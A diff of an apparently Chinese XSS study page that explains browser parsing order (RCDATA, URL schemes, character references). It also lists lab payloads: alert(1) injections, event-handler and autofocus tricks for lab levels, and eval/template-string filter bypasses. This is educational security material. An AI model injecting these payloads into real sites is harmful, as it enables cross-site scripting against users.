@@ -5038,13 +5038,13 @@ include demo.jpg
 &lt;p&gt;在 HTML 中有五类元素：&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;
-&lt;p&gt;空元素 (Void elements)，如&lt;area&gt;,&lt;base&gt;等等&lt;/p&gt;
+&lt;p&gt;空元素 (Void elements)，如 &lt;code&gt;&amp;lt;area&amp;gt;&lt;/code&gt; , &lt;code&gt;&amp;lt;base&amp;gt;&lt;/code&gt;  等等&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;原始文本元素 (Raw text elements)，有&lt;script&gt;和&lt;style&gt;&lt;/p&gt;
+&lt;p&gt;原始文本元素 (Raw text elements)，有 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;  和 &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;RCDATA 元素 (RCDATA elements)，有&lt;textarea&gt;和&lt;title&gt;&lt;/p&gt;
+&lt;p&gt;RCDATA 元素 (RCDATA elements)，有 &lt;code&gt;&amp;lt;textarea&amp;gt;&lt;/code&gt;  和 &lt;code&gt;&amp;lt;title&amp;gt;&lt;/code&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;外部元素 (Foreign elements)，例如 MathML 命名空间或者 SVG 命名空间的元素&lt;/p&gt;
@@ -5071,7 +5071,7 @@ include demo.jpg
 &lt;p&gt;基本元素，可以容纳文本、字符引用、其他元素和注释&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;如果我们回头看 HTML 解析器的规则，其中有一种可以容纳字符引用的情况是 “RCDATA 状态中的字符引用”。这意味着在&lt;textarea&gt;和&lt;title&gt;标签中的字符引用会被 HTML 解析器解码。这里要再提醒一次，在解析这些字符引用的过程中不会进入 “标签开始状态”。这样就可以解释问题 5 了。另外，对 RCDATA 有个特殊的情况。在浏览器解析 RCDATA 元素的过程中，解析器会进入 “RCDATA 状态”。在这个状态中，如果遇到 “&amp;lt;” 字符，它会转换到 “RCDATA 小于号状态”。如果 “&amp;lt;” 字符后没有紧跟着 “/” 和对应的标签名，解析器会转换回 “RCDATA 状态”。这意味着在 RCDATA 元素标签的内容中（例如&lt;textarea&gt;或&lt;title&gt;的内容中），唯一能够被解析器认做是标签的就是 “&lt;/textarea&gt;” 或者 “&lt;/title&gt;”。因此，在 “&lt;textarea&gt;” 和 “&lt;title&gt;” 的内容中不会创建标签，就不会有脚本能够执行。这也就解释了为什么问题 6 中的脚本不会被执行。&lt;/p&gt;
+&lt;p&gt;如果我们回头看 HTML 解析器的规则，其中有一种可以容纳字符引用的情况是 “RCDATA 状态中的字符引用”。这意味着在 &lt;code&gt;&amp;lt;textarea&amp;gt;&lt;/code&gt;  和 &lt;code&gt;&amp;lt;title&amp;gt;&lt;/code&gt;  标签中的字符引用会被 HTML 解析器解码。这里要再提醒一次，在解析这些字符引用的过程中不会进入 “标签开始状态”。这样就可以解释问题 5 了。另外，对 RCDATA 有个特殊的情况。在浏览器解析 RCDATA 元素的过程中，解析器会进入 “RCDATA 状态”。在这个状态中，如果遇到 “&amp;lt;” 字符，它会转换到 “RCDATA 小于号状态”。如果 “&amp;lt;” 字符后没有紧跟着 “/” 和对应的标签名，解析器会转换回 “RCDATA 状态”。这意味着在 RCDATA 元素标签的内容中（例如 &lt;code&gt;&amp;lt;textarea&amp;gt;&lt;/code&gt;  或 &lt;code&gt;&amp;lt;title&amp;gt;&lt;/code&gt;  的内容中），唯一能够被解析器认做是标签的就是 “ &lt;code&gt;&amp;lt;/textarea&amp;gt;&lt;/code&gt; ” 或者 “ &lt;code&gt;&amp;lt;/title&amp;gt;&lt;/code&gt; ”。因此，在 “ &lt;code&gt;&amp;lt;textarea&amp;gt;&lt;/code&gt; ” 和 “ &lt;code&gt;&amp;lt;title&amp;gt;&lt;/code&gt; ” 的内容中不会创建标签，就不会有脚本能够执行。这也就解释了为什么问题 6 中的脚本不会被执行。&lt;/p&gt;
 &lt;h3 id=&#34;url解析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#url解析&#34;&gt;#&lt;/a&gt; URL 解析&lt;/h3&gt;
 &lt;p&gt;首先，URL 资源类型必须是 ASCII 字母（U+0041-U+005A || U+0061-U+007A），不然就会进入 “无类型” 状态。例如， &lt;code&gt;你不能对协议类型进行任何的编码操作&lt;/code&gt; ，不然 URL 解析器会认为它无类型。这就是为什么问题 1 中的代码不能被执行。因为 URL 中被编码的 “javascript” 没有被解码，因此不会被 URL 解析器识别。该原则对协议后面的 “：”（冒号）同样适用，即问题 3 也得到解答。然而，你可能会想到：为什么问题 2 中的脚本被执行了呢？如果你记得我们在 HTML 解析部分讨论的内容的话，是否还记得有一个情况叫做 “属性值中的字符引用”，在这个情况中字符引用会被解码。我们将稍后讨论解析顺序，但在这里，HTML 解析器解析了文档，创建了标签 token，并且对 href 属性里的字符实体进行了解码。然后，当 HTML 解析器工作完成后，URL 解析器开始解析 href 属性值里的链接。在这时，“javascript” 协议已经被解码，它能够被 URL 解析器正确识别。然后 URL 解析器继续解析链接剩下的部分。由于是 “javascript” 协议，JavaScript 解析器开始工作并执行这段代码，这就是为什么问题 2 中的代码能够被执行。&lt;/p&gt;
 &lt;h3 id=&#34;javascript解析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#javascript解析&#34;&gt;#&lt;/a&gt; JavaScript 解析&lt;/h3&gt;
@@ -5098,13 +5098,13 @@ include demo.jpg
 &lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;comment&#34;&gt;//192.168.1.6:18888/xss/level1.php?name=test&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=&amp;lt;script&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=&amp;lt;input onclick/onmouseover&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=&amp;lt;a onclick/javascript&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=&amp;lt;img src&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=&amp;lt;iframe&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=&amp;lt;svg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=&amp;lt;video onloadstart=&lt;span class=&#34;title function_ invoke__&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) src=&lt;span class=&#34;string&#34;&gt;&amp;quot;/media/hack-the-plant.mp4&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;闭合 大小写 双写 编码&lt;/p&gt;
 &lt;p&gt;Level 10&lt;/p&gt;
-&lt;p&gt;?keyword=111&amp;amp;t_sort=1 type=“text” onclick=alert(1)&lt;/p&gt;
-&lt;p&gt;?keyword=111&amp;amp;t_sort=1 type=“text” onfocus=alert(1) autofocus=&amp;quot;true&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;?keyword=111&amp;amp;t_sort=1 type=&amp;quot;text&amp;quot; onclick=alert(1)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;?keyword=111&amp;amp;t_sort=1 type=&amp;quot;text&amp;quot; onfocus=alert(1) autofocus=&amp;quot;true&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Level 11&lt;/p&gt;
-&lt;p&gt;Post 提交 referer&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Post 提交 referer&lt;/code&gt;&lt;/p&gt;
 &lt;h2 id=&#34;模板字符串&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#模板字符串&#34;&gt;#&lt;/a&gt; 模板字符串&lt;/h2&gt;
 &lt;figure class=&#34;highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗，因为有tostring方法，把数组中第一个参数转为字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alert&lt;span class=&#34;string&#34;&gt;`a`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;literal&#34;&gt;undefined&lt;/span&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗，因为有$&amp;#123;&amp;#125;执行表达式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`&lt;span class=&#34;subst&#34;&gt;$&amp;#123;alert(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;&lt;/span&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) [&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;attr&#34;&gt;raw&lt;/span&gt;: &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗，相当于2前后加了个字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`a&lt;span class=&#34;subst&#34;&gt;$&amp;#123;alert(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;&lt;/span&gt;b`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) [&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;attr&#34;&gt;raw&lt;/span&gt;: &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//不弹，因为没有tostring，会放在数组中输出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`a`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;attr&#34;&gt;raw&lt;/span&gt;: &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//不弹，和上一条一样&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`alert(1)`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;alert(1)&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;attr&#34;&gt;raw&lt;/span&gt;: &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗，和3一样&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`alert(1) &lt;span class=&#34;subst&#34;&gt;$&amp;#123;alert(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;&lt;/span&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) [&lt;span class=&#34;string&#34;&gt;&amp;#x27;alert(1) &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;attr&#34;&gt;raw&lt;/span&gt;: &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗，此时不是模板字符串，是函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//不弹，虽然有$&amp;#123;&amp;#125;执行表达式，但此时alert是字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`&lt;span class=&#34;subst&#34;&gt;$&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;alert(1)&amp;#x27;&lt;/span&gt;&amp;#125;&lt;/span&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;attr&#34;&gt;raw&lt;/span&gt;: &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//不弹，虽然可以字符串中解析16进制和Unicode，但此时解析完后仍然为字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`&lt;span class=&#34;subst&#34;&gt;$&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;alert\x281\x29&amp;#x27;&lt;/span&gt;&amp;#125;&lt;/span&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;attr&#34;&gt;raw&lt;/span&gt;: &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//上面都是先解析$&amp;#123;&amp;#125;，最后在解析eval&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//对于call方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;alert(1)&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗，此时相当于eval(&amp;#x27;alert(1)&amp;#x27;),call相当于将eval内的执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`&lt;span class=&#34;subst&#34;&gt;$&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;alert\x281\x29&amp;#x27;&lt;/span&gt;&amp;#125;&lt;/span&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;literal&#34;&gt;undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗，前面的eval相当于tag，模板字符串前可以有tag，注意返回值的不同，此时返回的不是数组 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;`aaa &lt;span class=&#34;subst&#34;&gt;$&amp;#123;alert&lt;span class=&#34;string&#34;&gt;`1`&lt;/span&gt;&amp;#125;&lt;/span&gt; bbbb`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;aaa undefined bbbb&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//报错，不能对符号编码，因此的prompt不是字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`&lt;span class=&#34;subst&#34;&gt;$&amp;#123;prompt\x281\x29&amp;#125;&lt;/span&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;//弹窗&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;eval.call`&lt;/span&gt;$&amp;#123;&lt;span class=&#34;title function_&#34;&gt;prompt&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;&lt;span class=&#34;string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;undefined&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 